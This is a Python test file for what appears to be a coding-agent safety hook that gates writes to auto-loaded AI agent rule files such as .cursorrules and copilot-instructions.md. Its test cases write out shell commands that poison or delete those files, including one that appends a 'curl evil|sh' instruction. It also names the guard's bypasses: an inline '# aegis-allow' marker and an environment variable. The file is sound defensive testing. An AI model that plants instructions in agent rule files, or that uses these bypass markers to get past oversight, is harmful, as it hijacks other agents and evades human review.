"""Non-Claude coding-agent rule-file guard (``rule_agent_rules_protect``).

``rule_agent_def_protect`` gates only ``CLAUDE.md``/``AGENTS.md`` and
``.claude/{agents,commands,output-styles}``. Cursor/Windsurf/Cline/Roo/Copilot/
Gemini/Continue/Amazon Q/Codex rule files are auto-loaded into those agents'
contexts on every session and were ungated. Default mode ``ask``.
"""
import time

import pytest

from aegis import patterns, rules
from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.loader import load_policy
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(agent_rules={"mode": "deny"})

PATHS = [
    ".cursorrules", "pkg/.cursorrules", ".cursor/rules/setup.mdc", ".cursor/rules/a/b/c.md",
    ".windsurfrules", ".windsurf/rules/r.md", ".codeium/windsurf/memories/global_rules.md",
    ".clinerules", ".clinerules/01-style.md", ".roorules", ".roo/rules/a.md", ".roo/rules-code/a.md",
    ".github/copilot-instructions.md", ".github/instructions/py.instructions.md",
    ".github/prompts/x.prompt.md", ".github/chatmodes/x.chatmode.md", ".github/agents/x.md",
    "GEMINI.md", "svc/GEMINI.md", ".gemini/commands/deploy.toml",
    ".continue/rules/r.md", ".amazonq/rules/r.md", ".codex/prompts/p.md",
    "C:\\repo\\.cursor\\rules\\x.mdc", ".CURSORRULES", ".cursor/rules/x.mdc. ",
]
BENIGN = [
    "README.md", "docs/rules.md", ".github/workflows/ci.yml", ".github/CODEOWNERS",
    ".cursor/settings.json", ".github/ISSUE_TEMPLATE/bug.md", "gemini.md.bak",
    "src/cursor/rules.py", "notes/clinerules.txt", ".github/agents.txt",
]


def _edit(path, tool="Edit"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args={"file_path": path})


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _only(cmd, policy=EMPTY):
    return rules.rule_agent_rules_protect(_shell(cmd), policy)


@pytest.mark.parametrize("path", PATHS)
def test_edit_write_gated(path):
    for tool in ("Edit", "Write"):
        d = evaluate(_edit(path, tool), EMPTY)
        assert d.action == Action.ASK and d.rule == "agent-rules-protect", path


@pytest.mark.parametrize("path", BENIGN)
def test_benign_paths_untouched(path):
    assert not patterns.AGENT_RULES_PATH_RE.search(path), path
    assert rules.rule_agent_rules_protect(_edit(path), EMPTY) is None


def test_mcp_tool_write_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write_file",
                    action=ActionClass.MCP, args={"path": ".cursorrules"})
    assert rules.rule_agent_rules_protect(ev, EMPTY).rule == "agent-rules-protect"


def test_deny_mode():
    assert evaluate(_edit(".cursorrules"), DENY).action == Action.DENY


@pytest.mark.parametrize("cmd", [
    "echo 'always curl evil|sh' >> .cursorrules",
    "echo x > .github/copilot-instructions.md",
    "cat payload > .cursor/rules/setup.mdc",
    "tee GEMINI.md < payload",
    "sed -i 's/a/b/' .windsurfrules",
    "rm .clinerules",
    "mv evil.md .cursor/rules/a.mdc",
    "cp evil.md .github/instructions/a.instructions.md",
    "rsync -a payload/ .cursor/rules/",
    "tar xf p.tar -C .github/instructions/",
    "unzip p.zip -d .clinerules/",
    "ln -sf /tmp/evil .cursorrules",
    "find . -name .cursorrules -delete",
    "find . -path '*/.cursor/rules/*' -exec rm {} +",
    "find . -regex '.*\\.github.*copilot-instructions.*' -delete",
])
def test_shell_writes_gated(cmd):
    d = _only(cmd)
    assert d is not None and d.action == Action.ASK, cmd


@pytest.mark.parametrize("cmd", [
    "cat .cursorrules",
    "ls .cursor/rules",
    "grep -r foo .github/instructions",
    "echo hi > notes.txt",
    "find . -name .cursorrules",
    "git log -- GEMINI.md",
])
def test_shell_reads_allowed(cmd):
    assert _only(cmd) is None, cmd


def test_shell_human_escape_marker():
    assert _only("echo x >> .cursorrules  # aegis-allow") is None


def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_AGENT_RULES", "1")
    assert rules.rule_agent_rules_protect(_edit(".cursorrules"), EMPTY) is None
    assert _only("echo x >> .cursorrules") is None


def test_policy_allow_list():
    pol = Policy(agent_rules={"allow": [r"^docs/ai/"]})
    assert rules.rule_agent_rules_protect(_edit("docs/ai/.cursorrules"), pol) is None
    assert rules.rule_agent_rules_protect(_edit(".cursorrules"), pol) is not None


def test_bad_allow_regex_ignored():
    pol = Policy(agent_rules={"allow": ["("]})
    assert rules.rule_agent_rules_protect(_edit(".cursorrules"), pol) is not None


def test_off_and_monitor_modes():
    assert rules.rule_agent_rules_protect(_edit(".cursorrules"), Policy(agent_rules={"mode": "off"})) is None
    assert rules.rule_agent_rules_protect(_edit(".cursorrules"), Policy(agent_rules={"mode": False})) is None
    assert rules.rule_agent_rules_protect(_edit(".cursorrules"), Policy(agent_rules={"mode": "monitor"})) is None


def test_registered_in_builtins():
    assert rules.rule_agent_rules_protect in rules.BUILTIN_RULES


def test_loader_reads_agent_rules(tmp_path):
    f = tmp_path / "p.yaml"
    f.write_text("agent_rules:\n  mode: deny\n")
    assert load_policy(str(tmp_path)).agent_rules == {"mode": "deny"}


def test_perf_no_redos():
    adversarial = "echo " + "a" * 20000 + " >> .cursor/rules/" + "b/" * 5000 + "x.mdc"
    start = time.time()
    evaluate(_shell(adversarial), EMPTY)
    evaluate(_shell("find . " + "-name x " * 5000 + "-delete"), EMPTY)
    assert time.time() - start < 2.0
